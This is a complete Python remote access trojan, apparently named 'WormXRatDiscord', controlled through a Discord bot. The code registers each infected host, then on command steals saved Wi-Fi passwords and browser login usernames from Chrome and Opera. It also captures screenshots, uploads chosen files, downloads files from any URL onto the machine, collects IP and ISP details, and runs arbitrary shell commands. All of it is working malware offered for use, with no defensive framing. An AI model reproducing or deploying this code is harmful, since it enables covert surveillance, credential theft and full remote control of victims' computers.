# pip install discord pillow pyautogui requests pypiwin32

import discord
import socket
import subprocess
import pyautogui
import os
import uuid
import requests
import io
import threading
import sqlite3
import shutil
from tkinter import messagebox
from urllib.parse import urlparse

session = uuid.uuid4()
TOKEN = "" 

current_dir = os.getcwd()
intents = discord.Intents.default()
intents.message_content = True

try:
    response = requests.get('https://ipinfo.io/json')
    jsondataipinfo = response.json()
    country = jsondataipinfo.get('country', 'Unknown')
except:
    country = "Unknown"

client = discord.Client(intents=intents)
channel_ref = None

def get_hostname():
    return socket.gethostname().lower().replace(" ", "-")
    
async def send_msg(channel, text):
    if len(text) > 1900:
        with io.BytesIO(text.encode('utf-8')) as out_file:
            await channel.send("⚠️ Log too long", file=discord.File(out_file, filename="output.txt"))
    else:
        await channel.send(f"```\n{text}\n```")

def show_popup(msg):
    messagebox.showinfo("WormXRatDiscord", msg)

@client.event
async def on_ready():
    global channel_ref
    try:
        guild = client.guilds[0]
        name = get_hostname()
        channel_ref = await guild.create_text_channel(name)
        
        header = (
            f"✅ Connected: `{name}`\n"
            f"📍 Path: `{current_dir}`\n"
            f"📍 Country: `{country}`\n"
            f"Session: `{session}`\n"
            "--- Commands ---\n"
            "`!cmd <command>` | `!screen` | `!stealwifipasswords` | `!stealusernames`\n"
            "`!stealfile <file>` | `!saveoncomputer <link>` | `!stealpublicaddress` | `!stealwifiaddresses` | `!chatsendmsg` "
        )
        await channel_ref.send(header)
    except Exception as e:
        print(f"Error on_ready: {e}")

@client.event
async def on_message(message):
    global channel_ref, current_dir

    if message.author == client.user: return
    if channel_ref is None or message.channel.id != channel_ref.id: return

    if message.content == "!stealwifipasswords":
        try:
            meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace")
            profiles = [i.split(":")[1][1:-1] for i in meta_data.split('\n') if "All User Profile" in i]
            
            wifi_list = []
            for name in profiles:
                try:
                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', name, 'key=clear']).decode('utf-8', errors="backslashreplace")
                    password_line = [b.split(":")[1][1:-1] for b in results.split('\n') if "Key Content" in b]
                    password = password_line[0] if password_line else "None"
                    wifi_list.append(f"SSID: {name} Password: {password}")
                except:
                    wifi_list.append(f"SSID: {name} Password: ERROR")
            
            final_output = "\n".join(wifi_list) if wifi_list else "No Wi-Fi profiles found."
            await send_msg(message.channel, final_output)
        except Exception as e:
            await message.channel.send(f"❌ WiFi Error: {e}")

    elif message.content == "!stealusernames":
        paths = {
            "Chrome": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"),
            "Opera": os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable", "Login Data"),
            "Opera GX": os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Login Data")
        }
        temp_dir = os.environ.get("TEMP")
        temp_db = os.path.join(temp_dir, "browser_tmp.db")
        output_file = os.path.join(temp_dir, "extracted_users.txt")
        all_data = set()

        for browser_name, db_path in paths.items():
            if os.path.exists(db_path):
                try:
                    shutil.copyfile(db_path, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value FROM logins")
                    for raw_url, user in cursor.fetchall():
                        if user:
                            domain = urlparse(raw_url).netloc.replace("www.", "")
                            if domain: all_data.add(f"[{browser_name}] {domain}: {user}")
                    conn.close()
                    os.remove(temp_db)
                except: continue

        if all_data:
            with open(output_file, "w", encoding="utf-8") as f:
                f.write("\n".join(sorted(all_data)))
            await message.channel.send(file=discord.File(output_file))
            os.remove(output_file)
        else:
            await message.channel.send("❌ No usernames found.")

    elif message.content == "!screen":
        path = os.path.join(os.environ.get('TEMP', os.getcwd()), "s.png")
        try:
            pyautogui.screenshot(path)
            await message.channel.send(file=discord.File(path))
            os.remove(path)
        except Exception as e:
            await message.channel.send(f"Screenshot Error: {e}")

    elif message.content.startswith("!stealfile "):
        filename = message.content[len("!stealfile "):].strip()
        path = os.path.join(current_dir, filename)
        if os.path.exists(path) and os.path.isfile(path):
            try:
                await message.channel.send(file=discord.File(path))
            except Exception as e:
                await message.channel.send(f"❌ Download Error: {e}")
        else:
            await message.channel.send("❌ Error: File not found.")

    elif message.content.startswith("!saveoncomputer "):
        url = message.content[len("!saveoncomputer "):].strip()
        filename = url.split("/")[-1].split("?")[0] or "uploaded_file"
        path = os.path.join(current_dir, filename)
        try:
            r = requests.get(url, stream=True)
            if r.status_code == 200:
                with open(path, 'wb') as f:
                    for chunk in r.iter_content(chunk_size=8192): f.write(chunk)
                await message.channel.send(f"✅ Saved as: `{filename}`")
            else:
                await message.channel.send(f"❌ Status {r.status_code}")
        except Exception as e:
            await message.channel.send(f"❌ Error: {e}")

    elif message.content.startswith("!chatsendmsg "):
        announcemsg = message.content[len("!chatsendmsg "):].strip()
        threading.Thread(target=show_popup, args=(announcemsg,), daemon=True).start()
        await message.channel.send(f"✅ Pop-up sent.")
    
    elif message.content == "!stealwifiaddresses":
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            gateway = subprocess.check_output("powershell (Get-NetRoute -DestinationPrefix 0.0.0.0/0).NextHop", shell=True).decode().strip()
            output = f"Hostname: {socket.gethostname()}\nIPv4: {local_ip}\nGateway: {gateway}"
            await send_msg(message.channel, output)
        except Exception as e:
            await message.channel.send(f"Error: {e}")

    elif message.content == "!stealpublicaddress":
        try:
            data = requests.get('https://ipinfo.io/json', timeout=10).json()
            ip = data.get('ip', 'N/A')
            isp = requests.get(f'http://ip-api.com/json/{ip}?fields=isp', timeout=10).json().get('isp', 'N/A')
            info = f"🌐 IP: `{ip}`\n🏙️ City: `{data.get('city', 'N/A')}`\n🏢 ISP: `{isp}`"
            await message.channel.send(info)
        except Exception as e:
            await message.channel.send(f"❌ Error: {e}")

    elif message.content.startswith("!cmd "):
        cmd = message.content[5:].strip()
        if cmd.startswith("cd "):
            new_path = os.path.abspath(os.path.join(current_dir, cmd[3:].strip()))
            if os.path.isdir(new_path):
                current_dir = new_path
                await message.channel.send(f"📍 Directory: `{current_dir}`")
            else:
                await message.channel.send("❌ Not found.")
            return
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, encoding="cp852", errors="replace", cwd=current_dir)
            output = (result.stdout or result.stderr or "Executed.").strip()
            await send_msg(message.channel, output)
        except Exception as e:
            await message.channel.send(f"Error: {e}")

client.run(TOKEN)
